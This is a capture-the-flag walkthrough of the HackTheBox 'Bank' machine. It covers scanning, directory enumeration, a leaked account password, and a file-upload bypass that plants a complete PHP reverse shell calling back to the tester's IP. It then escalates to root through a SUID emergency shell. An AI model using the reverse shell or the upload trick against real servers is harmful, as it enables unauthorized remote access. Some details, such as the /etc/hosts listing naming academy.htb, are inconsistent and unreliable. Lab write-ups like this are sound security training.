### Nmap Scan

I do a `nmap scan`:

```sh
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 15:42 EDT
Stats: 0:00:25 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 94.56% done; ETC: 15:42 (0:00:00 remaining)
Nmap scan report for 10.10.10.29
Host is up (0.12s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)
|   2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)
|   256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)
|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)
53/tcp open  domain  ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.02 seconds
```

I think that the domain is `bank.htb`, thereby I edit this file `/etc/hosts` in this way:
```sh
┌──(kali㉿kali)-[~]
└─$ sudo nano /etc/hosts                       
[sudo] password for kali: 

┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.215    academy.htb
```


## HTTP

### Directory Enumeration

I do a directory enumeration with `gobuster`:
```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://bank.htb/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --threads 100 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bank.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/13 16:14:49 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
/server-status        (Status: 403) [Size: 288]
/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
Progress: 220081 / 220561 (99.92%)
===============================================================
2023/08/13 15:57:03 Finished
===============================================================
```

I go in this directory `/balance-tranfer`  and I find all file with a size more or less the same, but there is a file with a different size:
```
...
68576f20e9732f1b2edc4df5b8533230.acc 2017-06-15 09:50 257 
...
```

I see the content:
```
--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===
```

Good, now I can do the login in this directory `/login.php`

### File Upload Attack

In this directory  `/support.php` I can upload a file, so I try to upload a reverse shell in `.php` , but don't works, I use the same reverse shell, but I change the extension in `.htb` :

- Reverse shell:
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.134 ';
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```


- Request:
```http
POST /support.php HTTP/1.1
Host: bank.htb
Content-Length: 3096
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://bank.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryR0fKDibGFZl6nf32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://bank.htb/support.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: HTBBankAuth=6ke0nh95inm8vh1ef9nukjs3k4
Connection: close

------WebKitFormBoundaryR0fKDibGFZl6nf32
Content-Disposition: form-data; name="title"

cyberspider
------WebKitFormBoundaryR0fKDibGFZl6nf32
Content-Disposition: form-data; name="message"

RevShell
------WebKitFormBoundaryR0fKDibGFZl6nf32
Content-Disposition: form-data; name="fileToUpload"; filename="revshell.htb"

Content-Type: application/octet-stream

<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: 
...
```

- Response:
```http
HTTP/1.1 200 OK
Date: Mon, 14 Aug 2023 06:57:30 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 5765
Connection: close
Content-Type: text/html

<!DOCTYPE html>
<html>
  <head>
...
```


I open a Listening Port:
```
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234       
listening on [any] 1234 ...
```

I  visit this directory `/uploads/revshell.htb` to do  execute the reverse shell in the system:
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 1234       
listening on [any] 1234 ...
connect to [10.10.14.134] from (UNKNOWN) [10.10.10.29] 57630
Linux bank 4.4.0-79-generic #100~14.04.1-Ubuntu SMP Fri May 19 18:37:52 UTC 2017 i686 i686 i686 GNU/Linux
 10:04:11 up  7:03,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$ /bin/bash -i
bash: cannot set terminal process group (1071): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bank:/$ ls
ls
bin
boot
dev
etc
home
initrd.img
initrd.img.old
lib
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

I take the `user flag`:
```
www-data@bank:/$ cd home
cd home
www-data@bank:/home$ ls
ls
chris
www-data@bank:/home$ cd chris
cd chris
www-data@bank:/home/chris$ ls
ls
user.txt
www-data@bank:/home/chris$ cat user.txt 
cat user.txt
143a481d897254ce089c9a261d2c8179
www-data@bank:/home/chris$ ls -all
ls -all
total 32
drwxr-xr-x 3 chris chris 4096 Jun 14  2017 .
drwxr-xr-x 3 root  root  4096 May 28  2017 ..
-rw------- 1 root  root     2 Jun 15  2017 .bash_history
-rw-r--r-- 1 chris chris  220 May 28  2017 .bash_logout
-rw-r--r-- 1 chris chris 3637 May 28  2017 .bashrc
drwx------ 2 chris chris 4096 May 28  2017 .cache
-rw-r--r-- 1 chris chris  675 May 28  2017 .profile
-r--r--r-- 1 chris chris   33 Aug 14 03:01 user.txt
www-data@bank:/home/chris$ cat user.txt 
cat user.txt
143a481d897254ce089c9a261d2c8179
```


## Privilege Escalation 

I search  the binaries with the `SETUID` bit set:
```sh
www-data@bank:/$ find / -perm -4000 2>/dev/null | grep "/bin/"
find / -perm -4000 2>/dev/null | grep "/bin/"
/var/htb/bin/emergency
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

I go in this directory `/var/htb/` and list the file:
```sh
www-data@bank:/var/htb$ ls -all
ls -all
total 16
drwxr-xr-x  3 root root 4096 Jun 14  2017 .
drwxr-xr-x 14 root root 4096 May 29  2017 ..
drwxr-xr-x  2 root root 4096 Jun 14  2017 bin
-rwxr-xr-x  1 root root  356 Jun 14  2017 emergency
```

I read the script `emergency`:
```sh
www-data@bank:/var/htb$ cat emergency 
cat emergency
```
```python
#!/usr/bin/python
import os, sys

def close():
        print "Bye"
        sys.exit()

def getroot():
        try:
                print "Popping up root shell..";
                os.system("/var/htb/bin/emergency")
                close()
        except:
                sys.exit()

q1 = raw_input("[!] Do you want to get a root shell? (THIS SCRIPT IS FOR EMERGENCY ONLY) [y/n]: ");

if q1 == "y" or q1 == "yes":
        getroot()
else:
        close()
```

I Spawn the `root shell`:
```sh
www-data@bank:/var/htb$ ./emergency       
./emergency
y
whoami
root
```

I take the `root flag`:
```
cat /root/root.txt 
10a3084caaacfe7f6b5d54a919543f6d
```


